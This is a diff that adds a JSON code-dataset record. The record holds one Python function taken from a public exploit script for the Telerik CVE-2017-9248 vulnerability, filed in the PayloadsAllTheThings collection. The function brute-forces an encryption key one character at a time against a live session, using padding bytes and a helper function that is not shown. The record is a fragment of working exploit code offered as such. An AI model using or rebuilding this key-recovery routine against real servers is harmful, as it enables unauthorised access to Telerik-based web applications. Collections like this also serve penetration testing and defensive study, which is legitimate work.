@@ -1,0 +1,7 @@
+{
+    "code": "def test_keypos(key_charset, unprintable, found, session):\n    pad_chars = ''\n    for pad_char in range(256):\n        pad_chars += chr(pad_char)\n\n    for i in range(len(pad_chars)):\n        for k in range(len(key_charset)):\n            keychar = key_charset[k]\n            sys.stdout.write(\"\\b\"*6)\n            sys.stdout.write(\n                        (\n                            keychar\n                            if unprintable is False\n                            else '+'\n                        ) +\n                        \") [\" + (\n                            keychar\n                            if unprintable is False\n                            else '+'\n                        ) +\n                        \"]\"\n                    )\n            sys.stdout.flush()\n            if test_keychar(keychar, found, session, pad_chars[i] * 3):\n                return keychar\n    return False",
+    "source": "github_repo:swisskyrepo/PayloadsAllTheThings",
+    "file": "CVE Exploits/Telerik CVE-2017-9248.py",
+    "license": "MIT",
+    "language": "python"
+}
